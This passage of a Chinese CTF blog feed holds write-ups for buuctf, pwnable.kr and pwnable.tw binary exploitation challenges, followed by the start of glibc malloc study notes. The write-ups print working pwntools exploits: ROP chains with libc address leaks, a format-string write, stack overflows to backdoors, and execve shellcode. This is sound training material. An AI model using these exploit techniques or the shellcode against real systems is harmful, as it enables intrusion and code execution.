class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;%12$nxxx&#x27;</span>+p32(<span class="number">0x804C044</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护,只开了nx</p><p>ida反汇编,程序为一个菜单式程序</p><p>没有system函数和/bin/sh字符串</p><p>基本确定为libc泄露类题</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_212742.png" alt=""></p><p>危险函数如上</p><p>这个循环会修改我们的输入但是有可以跳过的办法,即v0一定是一个大于零的数,则只要payload开头为<strong>\x00</strong>就行了</p><p><strong>exp</strong>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">e=ELF(<span class="string">&#x27;./12&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">padding=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span> <span class="comment">#这里脑抽，0x50换算成了十进制，填的时候又加了0x，被报错折磨了半个小时才发现，我好菜</span></span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)   <span class="comment">#puts自带换行</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#64位函数真实地址一般只占6个字节，且最高位为&#x27;\x7f&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  <span class="comment">#可以选择用Lincsearcher来直接pwntools中操作，但我还是选择用libcdatabase这个网站查询获得地址</span></span><br><span class="line">libc_base=puts_addr-<span class="number">0x0809c0</span></span><br><span class="line">system=libc_base+<span class="number">0x04f440</span></span><br><span class="line">binsh=libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(padding+p64(rdi_addr)+p64(binsh)+p64(ret)+p64(system)) <span class="comment">#这里有个栈对齐，下面说一说</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" cyan><summary> 补充一个可能所有人都知道但我做这道题才认真思考了的问题 </summary>              <div class='content'>              <p>即ELF.symbol,ELF.plt,ELF.got的使用区分</p><p>ELF.plt得到的plt的地址,ELF.plt的内容首项是ELF.got的地址,ELF.got的内容是函数的真实加载地址</p><p>ELF.plt内容指向ELF.got的地址,当需要访问函数的真实加载地址就需要访问ELF.got内容,但动态链接下,初始ELF.got项必然不是函数真实地址,且访问ELF.got又需要访问ELF.plt</p><p>另外ELF.plt一定能进入函数,ELF.got则不一定</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-25_211747.png" alt=""></p><p>使用哪个,则要看需要访问的内容,要实现什么目的</p><p>再来看symbols和plt的使用场合</p><p>这两个很多时候返回是相同的(差不多可以当作一个用了,像这题,puts_plt=e.symbols[‘puts’也是可以的])</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ELF.symbols适用场景：</span><br><span class="line">查找特定符号的地址，例如函数的入口地址、全局变量的地址等。</span><br><span class="line">枚举可执行文件中的所有符号，例如枚举所有导出函数。优先考虑PLT条目，而不是GOT条目。</span><br><span class="line">ELF.plt适用场景：</span><br><span class="line">查找需要动态链接的函数的入口地址，例如为调用某个函数进行ROP攻击时。</span><br><span class="line">枚举需要动态链接的函数，例如枚举可执行文件依赖的所有共享库中的导出函数。</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" yellow><summary> 因为不严谨导致问题的细节 </summary>              <div class='content'>              <p>其实就是一些小细节</p><ol><li>send和sendline的使用,大多数时候二者没有差别,但是诸如遇到了getchar(),gets()这些函数,就只能用sendline(或者send自己加\n)了,因为这两个函数不接收到\n就不会继续执行,导致程序的执行卡住,不能往下执行</li><li>puts函数输出时会自带\n,接收时要注意</li></ol>              </div>            </details><details class="folding-tag" green><summary> 栈对齐 </summary>              <div class='content'>              <p>距离shell临门一脚的坑</p><p>ubuntu18后64位下</p><p>system函数执行过程中会有这么一条指令</p><p><code>movaps xmmword ptr [rsp + 0x??], xmm0</code></p><p>故而就要求在运行到该处时.rsp要是16的整数倍,</p><p>又由于程序指令的相对不变性,所以需要对<strong>system函数地址在栈中的存放地址有要求</strong></p><p>一般来说都是要使得<strong>system函数地址在栈中的存放地址要是16的整数倍</strong>(不一定),即能达到上述目的</p><p>除system外,printf等函数也会有这种指令,也就是上面提到的跳过栈帧开辟</p>              </div>            </details><p><strong>这题其实是第一题我自己做出来的libc泄露类题目,虽然之前接触过不少,但都没有实操,亲自做了一遍,收获很大</strong></p><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>ida一看,就是对一个数组进行输入,第14个元素如果等于17则拿到shell</p><p>唯一值得注意的就是</p><p><code>if ( *(_QWORD *)&amp;var[13] )</code>将dword指针变为了qword指针,所以第15个元素得留空,不过以防之前栈中存留了一些数据,也可以用p64打包直接覆盖</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26449</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(<span class="number">0x0</span>)*<span class="number">13</span>+p64(<span class="number">0x11</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>好几次遇到了同一个问题,进入shell模式后,第一条指令永远没有输出,虽然无伤大雅,且并不是每题都这样,但强迫症很难受啊</p><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>保护只开了nx</p><p>ida查看有system函数,而且能找到到binsh字符串</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.recv()</span><br><span class="line">system=<span class="number">0x0804845C</span></span><br><span class="line">binsh=<span class="number">0x0804A024</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span>+p32(system)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>常规入门题</p><p>只不过read字符数由自己输入</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">p.recv()</span><br><span class="line">backdoor=<span class="number">0x4006EA</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>标准流程就不重复了,这题单看题不难,但坑是一个接着一个</p><p>第一个坑,ida显示的v4距返回地址计算出来应该是60,但是实际去gdb调试会发现应该是56,之前做了那么多题都是直接用ida给的数据,这次突然跳出来一个不准的确实很搞人（主要这题栈帧不是常见的类型）,也算得到了一个教训,最好还是gdb实操计算偏移,当然直接去读汇编代码也能得出正确结果</p><p>第二个大坑,就是这题没有设置setbuf(stdout，0)，所以本题的输出是缓存在服务器本地的，换句话说：如果程序不正常退出，本地是不会有输出的,所以必须要正常退出,其实这也应该是第一题我没能接收信息卡住的原因</p><p>更多可见基础杂烩篇</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27423</span>)</span><br><span class="line">backdoor=<span class="number">0x080489A0</span></span><br><span class="line">exit= <span class="number">0x0804E6A0</span>  <span class="comment">#很重要</span></span><br><span class="line">a1=<span class="number">0x308CD64F</span></span><br><span class="line">a2=<span class="number">0x195719D1</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(backdoor)+p32(exit)+p32(a1)+p32(a2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">刷</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="buuctf" scheme="https://ixout.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr刷题记录-1</title>
    <link href="https://ixout.github.io/posts/4569/"/>
    <id>https://ixout.github.io/posts/4569/</id>
    <published>2023-03-20T13:46:51.000Z</published>
    <updated>2023-03-27T06:13:44.313Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>ssh连上之后，ls发现三个有效文件fd,fd.c,flag</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_220727.png" alt=""></p><p>flag没有任何权限向我们开放</p><p>再看fd.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ cat fd.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码问题不大,考验的就是对linux系统read函数最基本的了解了,0是标准输入,使fd为0即可,0x1234转换为十进制即是4660</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br></pre></td></tr></table></figure><ul><li>atoi()：atoi()函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab 缩进等，可以通过 isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(‘\0’)才结束转换，并将结果返回，返回转换后的整型数；如果 str 不能转换成 int 或者 str 为空字符串，那么将返回 0。</li></ul><hr><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>连上后三个文件,文件样式和权限和上一题一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line"><span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c语言基础不牢,char* a[]知道是由字符指针组成的数组,但一时竟不知道每一个成员还可以代表指向一个字符串🤔</p><p>输入要为20个字节(字符),以16进制存储,进入check函数,会被强制转为int*指针,即输入的20个字符被视为了5个int数</p><p>现在就是要想办法构造出hashcode了,这里构造四处查了一些资料,有两种办法</p><ol><li>全部用可打印字符表示,好处是直观,但要计算有点麻烦</li><li>无论是否可见用十六进制ascii码表示,好处是基本没有计算量,但直接输入十六进制数据依然会被视作字符,所以需要用到python</li></ol><p>我选择用第二种方法(因为第一种要控制可打印字符大麻烦了😢)</p><p>键入(别忘了小端序)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col $(python -c <span class="string">&#x27;print &quot;\x01&quot;*16+&quot;\xe8\x05\xd9\x1d&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>前面的16字节我一开始还打算用\x00填充,还想怎么老是提示长度不够,结果忘了strlen()测量长度到\x00结束🙂</p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>是熟悉的味道😭</p><p>检查保护</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-21_163931.png" alt=""></p><p>ida看一看</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-21_163837.png" alt=""></p><p>a1是这个函数的参数,也就是在返回地址上一个</p><p>使a1的值为-889275714,我还傻乎乎的打算去用补码换算成十六进制,结果发现汇编代码中就有直接的十六进制数据0CAFEBABEh</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span>+<span class="string">b&#x27;\xbe\xba\xfe\xca&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>给了一个flag文件，ida打开提示upx加壳，脱壳后flag以明文形式存在</p>]]></content>
    
    
    <summary type="html">比tw简单一点</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="pwnable.kr" scheme="https://ixout.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw刷题记录-1</title>
    <link href="https://ixout.github.io/posts/10836/"/>
    <id>https://ixout.github.io/posts/10836/</id>
    <published>2023-03-20T01:01:55.000Z</published>
    <updated>2023-04-08T14:28:37.329Z</updated>
    
    <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>第一步检查保护,是久违的感觉😂</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_082554.png" alt=""></p><hr><p>ida打开看看</p><p>不难发现其不是标准栈帧结构,🔒以ida反汇编不了(百度可以搜索解决办法),好在不长直接看汇编代码吧.</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_091524.png" alt=""></p><p>程序主体是两个系统调用read和write,其中read读取60个字节明显有溢出,但要怎么利用是关键</p><p>首选自然是ret2shellcode了,但ret2shellcode需要栈地址,可以看到程序起始有向栈中压入esp,我们可以选择借用write系统调用将其泄露,剩下的就是常规操作了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))+<span class="number">0x14</span> <span class="comment">#加14是因为最后又抬高了esp一次</span></span><br><span class="line">p.recv()</span><br><span class="line">sh=<span class="string">b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(stack)+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-201.png" alt=""></p><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/orw&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>沙盒题,getshell是很难做到的</p><p>程序的内容十分简单,比上一题还简单</p><p>但是因为orw的缘故也不白给</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">这就是在难为我了</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="刷题记录" scheme="https://ixout.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    <category term="pwnable.tw" scheme="https://ixout.github.io/tags/pwnable-tw/"/>
    
  </entry>
  
  <entry>
    <title>堆学习笔记-2</title>
    <link href="https://ixout.github.io/posts/40023/"/>
    <id>https://ixout.github.io/posts/40023/</id>
    <published>2023-03-18T08:17:28.000Z</published>
    <updated>2023-04-01T14:51:57.659Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一篇堆学习笔记主要还是基础性的知识要多一点，像malloc和free的流程都只是贴了张图，这篇文章则稍微更深入一点点。</p><h1 id="无tcache"><a href="#无tcache" class="headerlink" title="无tcache"></a>无tcache</h1><h2 id="malloc初始化"><a href="#malloc初始化" class="headerlink" title="malloc初始化"></a>malloc初始化</h2><p>malloc的入口是是_libc_malloc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* __libc_malloc (<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">  <span class="comment">// First part: callback</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// Second part  </span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// Third part</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码可以看出，主要包含<strong>callback、arena_get、_int_malloc</strong>这几步，我们把<strong>callback和arena_get当作初始化</strong>的过程，_<strong>int_malloc作为实际分配</strong>的过程，本文着重来看初始化的过程，下篇文章再看_int_malloc。</p><p>再额外说一下builtin_expect，它是gcc的扩展，用来允许程序员将最有可能执行的分支告诉编译器，这样编译器就可以对分支预测做一些优化，简单来讲就是在遇到分支的时候，先生成大概率分支的指令，这样指令cache的命中率会变高，具体细节可以参考gcc的官方文档（以GCC10.1为例：<a href="https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtins），有时也会将__builtin_expect指令封装为likely和unlikely宏，它们的定义如下所示：">https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtins），有时也会将__builtin_expect指令封装为likely和unlikely宏，它们的定义如下所示：</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> likely(expr) __builtin_expect(!!(expr), 1) <span class="comment">//expr很可能为真</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(expr) __builtin_expect(!!(expr), 0) <span class="comment">//expr很可能为假</span></span></span><br></pre></td></tr></table></figure><h3 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h3><p>先看前面代码1中的first part，如下两句，第一句是给函数指针变量赋值，第二句是函数调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>hook是一个函数指针变量，被赋值成了__malloc_hook，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br></pre></td></tr></table></figure><p>__malloc_hook被初始化成了malloc_hook_ini，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 